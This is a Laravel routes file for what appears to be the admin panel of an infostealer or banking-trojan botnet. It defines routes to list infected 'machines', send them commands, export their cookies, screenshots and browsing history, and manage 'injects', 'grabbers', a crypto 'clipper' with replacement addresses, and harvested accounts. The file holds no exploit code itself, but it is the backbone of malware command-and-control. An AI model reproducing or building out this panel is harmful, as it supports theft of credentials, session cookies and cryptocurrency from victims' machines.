<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::group(['prefix' => 'admin'], function () {
    Route::get('', [\App\Http\Controllers\MachineController::class, 'index'])->middleware('auth')->name('index');
    Route::get('active', [\App\Http\Controllers\MachineController::class, 'index'])->middleware('auth')->name('index.active');
    Route::get('online', [\App\Http\Controllers\MachineController::class, 'index'])->middleware('auth')->name('index.online');
    Route::get('offline', [\App\Http\Controllers\MachineController::class, 'index'])->middleware('auth')->name('index.offline');
    Route::get('archives', [\App\Http\Controllers\MachineController::class, 'index'])->middleware('auth')->name('index.archives');

    Route::group(['prefix' => 'machines', 'middleware' => 'auth'], function () {
        Route::get('', [\App\Http\Controllers\MachineController::class, 'getItems'])->name('machines');
        Route::get('active', [\App\Http\Controllers\MachineController::class, 'getActiveItems'])->name('machines.active');
        Route::get('online', [\App\Http\Controllers\MachineController::class, 'getOnlineItems'])->name('machines.online');
        Route::get('offline', [\App\Http\Controllers\MachineController::class, 'getOfflineItems'])->name('machines.offline');
        Route::get('archives', [\App\Http\Controllers\MachineController::class, 'getArchiveItems'])->name('machines.archives');
    });

    Route::group(['prefix' => 'machines', 'middleware' => ['auth', 'admin']], function () {
        Route::get('{id}', [\App\Http\Controllers\MachineController::class, 'getItem'])->name('machines.info');
        Route::get('{id}/commands', [\App\Http\Controllers\MachineController::class, 'getItemCommands'])->name('machines.commands');
        Route::get('{id}/cookies', [\App\Http\Controllers\MachineController::class, 'getItemCookies'])->name('machines.cookies');
        Route::get('{id}/cookies/export', [\App\Http\Controllers\MachineController::class, 'exportItemCookies'])->name('machines.cookies.export');
        Route::get('{id}/screenshot', [\App\Http\Controllers\MachineController::class, 'exportScreenshot'])->name('machines.screenshot');
        Route::get('{id}/history', [\App\Http\Controllers\MachineController::class, 'exportHistory'])->name('machines.history');
        Route::get('{id}/extensions', [\App\Http\Controllers\MachineController::class, 'getItemExtensions'])->name('machines.extensions');
        Route::get('{id}/grabbers', [\App\Http\Controllers\MachineController::class, 'getItemGrabbers'])->name('machines.grabbers');
        Route::get('{id}/checkers', [\App\Http\Controllers\MachineController::class, 'getCheckers'])->name('machines.checkers');
        Route::get('{id}/remove', [\App\Http\Controllers\MachineController::class, 'removeItem'])->name('machines.remove');
        Route::get('{id}/archive', [\App\Http\Controllers\MachineController::class, 'archiveItem'])->name('machines.archive');
        Route::get('{id}/proxy', [\App\Http\Controllers\MachineController::class, 'setProxy'])->name('machines.proxy');
        Route::post('{id}/comment', [\App\Http\Controllers\MachineController::class, 'setComment'])->name('machines.comment');
    });

    Route::group(['prefix' => 'profile', 'middleware' => ['auth', 'admin']], function () {
        Route::get('settings', [\App\Http\Controllers\ProfileController::class, 'settings'])->name('profile.settings');
        Route::post('settings', [\App\Http\Controllers\ProfileController::class, 'saveSettings'])->name('profile.settings.save');
    });

    Route::group(['prefix' => 'commands', 'middleware' => ['auth', 'admin']], function () {
        Route::post('', [\App\Http\Controllers\CommandController::class, 'create'])->name('commands.create');
    });

    Route::group(['prefix' => 'injects', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\InjectController::class, 'index'])->name('injects');
        Route::get('items', [\App\Http\Controllers\InjectController::class, 'getItems'])->name('injects.items');
        Route::get('create', [\App\Http\Controllers\InjectController::class, 'getItem'])->name('injects.create');
        Route::post('create', [\App\Http\Controllers\InjectController::class, 'createOrEditItem'])->name('injects.create.action');

        Route::get('{id}', [\App\Http\Controllers\InjectController::class, 'getItem'])->name('injects.info');
        Route::get('{id}/remove', [\App\Http\Controllers\InjectController::class, 'removeItem'])->name('injects.remove');
    });

    Route::group(['prefix' => 'clipper', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\ClipperController::class, 'index'])->name('clipper');
        Route::get('items', [\App\Http\Controllers\ClipperController::class, 'getItems'])->name('clipper.items');
        Route::get('create', [\App\Http\Controllers\ClipperController::class, 'getItem'])->name('clipper.create');
        Route::post('create', [\App\Http\Controllers\ClipperController::class, 'createOrEditItem'])->name('clipper.create.action');

        Route::get('{id}', [\App\Http\Controllers\ClipperController::class, 'getItem'])->name('clipper.info');
        Route::get('{id}/remove', [\App\Http\Controllers\ClipperController::class, 'removeItem'])->name('clipper.remove');
    });

    Route::group(['prefix' => 'accounts', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\AccountController::class, 'index'])->name('accounts');
        Route::get('items', [\App\Http\Controllers\AccountController::class, 'getItems'])->name('accounts.items');

        Route::get('{id}/remove', [\App\Http\Controllers\AccountController::class, 'removeItem'])->name('accounts.remove');
    });

    Route::group(['prefix' => 'addresses', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\AddressController::class, 'index'])->name('addresses');
        Route::get('items', [\App\Http\Controllers\AddressController::class, 'getItems'])->name('addresses.items');
        Route::get('create', [\App\Http\Controllers\AddressController::class, 'getItem'])->name('addresses.create');
        Route::post('create', [\App\Http\Controllers\AddressController::class, 'createOrEditItem'])->name('addresses.create.action');

        Route::get('{id}', [\App\Http\Controllers\AddressController::class, 'getItem'])->name('addresses.info');
        Route::get('{id}/remove', [\App\Http\Controllers\AddressController::class, 'removeItem'])->name('addresses.remove');
    });

    Route::group(['prefix' => 'commands', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\CommandController::class, 'index'])->name('commands');
    });

    Route::group(['prefix' => 'settings', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\SettingController::class, 'index'])->name('settings');
        Route::post('', [\App\Http\Controllers\SettingController::class, 'save'])->name('settings.save');
    });

    Route::group(['prefix' => 'grabbers', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\GrabberController::class, 'index'])->name('grabber');
        Route::get('items', [\App\Http\Controllers\GrabberController::class, 'getItems'])->name('grabber.items');
    });

    Route::group(['prefix' => 'extensions', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\ExtensionController::class, 'index'])->name('extensions');
        Route::get('items', [\App\Http\Controllers\ExtensionController::class, 'getItems'])->name('extensions.items');
    });

    Route::group(['prefix' => 'counter-urls', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\CounterUrlController::class, 'index'])->name('counter_urls');
        Route::get('items', [\App\Http\Controllers\CounterUrlController::class, 'getItems'])->name('counter_urls.items');
    });

    Route::group(['prefix' => 'cookie_settings', 'middleware' => ['auth', 'admin']], function () {
        Route::get('', [\App\Http\Controllers\CookieSettingController::class, 'index'])->name('cookie_settings');
        Route::get('items', [\App\Http\Controllers\CookieSettingController::class, 'getItems'])->name('cookie_settings.items');
        Route::get('create', [\App\Http\Controllers\CookieSettingController::class, 'getItem'])->name('cookie_settings.create');
        Route::post('create', [\App\Http\Controllers\CookieSettingController::class, 'createOrEditItem'])->name('cookie_settings.create.action');
        Route::post('download', [\App\Http\Controllers\CookieSettingController::class, 'download'])->name('cookie_settings.download');

        Route::get('{id}', [\App\Http\Controllers\CookieSettingController::class, 'getItem'])->name('cookie_settings.info');
        Route::get('{id}/remove', [\App\Http\Controllers\CookieSettingController::class, 'removeItem'])->name('cookie_settings.remove');
    });

    Route::get('/login', [\App\Http\Controllers\AuthController::class, 'login'])->name('login');
    Route::get('/logout', [\App\Http\Controllers\AuthController::class, 'logoutAction'])->name('logout');
    Route::post('/login', [\App\Http\Controllers\AuthController::class, 'loginAction'])->name('login_action');
});
